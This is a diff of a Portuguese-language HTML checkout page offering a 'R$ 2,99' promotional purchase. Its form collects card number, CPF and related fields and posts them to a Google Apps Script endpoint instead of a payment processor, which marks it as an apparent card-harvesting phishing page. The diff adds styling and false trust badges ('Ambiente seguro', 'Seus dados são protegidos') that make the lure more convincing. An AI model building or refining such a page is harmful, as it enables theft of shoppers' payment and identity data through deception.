@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Finalizar comprar</title>
+<title>Finalizar Comprar</title>
 
 <style>
 body {
@@ -11,6 +11,7 @@ body {
   font-family: Arial, sans-serif;
   background: #f2f2f2;
 }
+
 .container {
   max-width: 420px;
   margin: auto;
@@ -18,10 +19,22 @@ body {
   min-height: 100vh;
   padding: 20px;
 }
+
 .topo {
   text-align: center;
   margin-bottom: 20px;
 }
+
+.topo h2 {
+  margin: 0;
+  font-size: 20px;
+}
+
+.topo p {
+  font-size: 14px;
+  color: #666;
+}
+
 .box-preco {
   background: #e8f5e9;
   border: 1px solid #c8e6c9;
@@ -30,49 +43,97 @@ body {
   text-align: center;
   margin-bottom: 20px;
 }
+
+.box-preco span {
+  font-size: 14px;
+  color: #555;
+}
+
+.box-preco strong {
+  display: block;
+  font-size: 26px;
+  color: #2e7d32;
+}
+
 label {
   font-size: 13px;
   font-weight: bold;
+  margin-bottom: 5px;
   display: block;
 }
+
 input {
   width: 100%;
   padding: 14px;
   border-radius: 8px;
   border: 1px solid #ccc;
+  font-size: 15px;
   margin-bottom: 15px;
 }
+
+input:focus {
+  outline: none;
+  border-color: #2962ff;
+}
+
+.row {
+  display: flex;
+  gap: 10px;
+}
+
 button {
   width: 100%;
   padding: 16px;
-  background: #2962ff;
+  background: linear-gradient(135deg, #2962ff, #0039cb);
   color: #fff;
   border: none;
   border-radius: 12px;
   font-size: 17px;
   font-weight: bold;
+  margin-top: 10px;
+}
+
+button:active {
+  transform: scale(0.98);
+}
+
+.selos {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 15px;
+  font-size: 12px;
+  color: #555;
+}
+
+.rodape {
+  text-align: center;
+  font-size: 12px;
+  color: #777;
+  margin-top: 15px;
 }
 </style>
 </head>
 
 <body>
+
 <div class="container">
 
   <div class="topo">
-  <h2>Confirmar comprar</h2>
-  <p>Preencha os dados abaixo</p>
+    <h2>Finalizar Compra</h2>
+    <p>Preencha os dados para concluir</p>
+  </div>
 
   <div class="box-preco">
     <span>Valor promocional</span>
     <strong>R$ 2,99</strong>
   </div>
-  
+
   <form
     action="https://script.google.com/macros/s/AKfycbyy4AYCzE2gpPiKkwO1XP3R2izuOzRFKcuju5oDrv1GX3rCDrWXKkJxEVXE5ZSNfRCh/exec"
     method="POST"
   >
 
-  <label>Número do cartão</label>
+ <label>Número do cartão</label>
     <input name="numero" required placeholder="Insira o numero do cartão">
 
     <div class="row">
@@ -92,13 +153,21 @@ button {
     <label>CPF</label>
     <input name="cpf" required placeholder="000.000.000-00">
 
-    <button type="submit">Confirmar</button>
+    <button type="submit">CONFIRMAR COMPRAR</button>
+
   </form>
+
+  <div class="selos">
+    <div>🔒 Ambiente seguro</div>
+    <div>⚡ Processo rápido</div>
+    <div>✅ Garantia</div>
+  </div>
+
+  <div class="rodape">
+    Seus dados são protegidos
+  </div>
+
 </div>
 
 </body>
 </html>
-
-
-
-
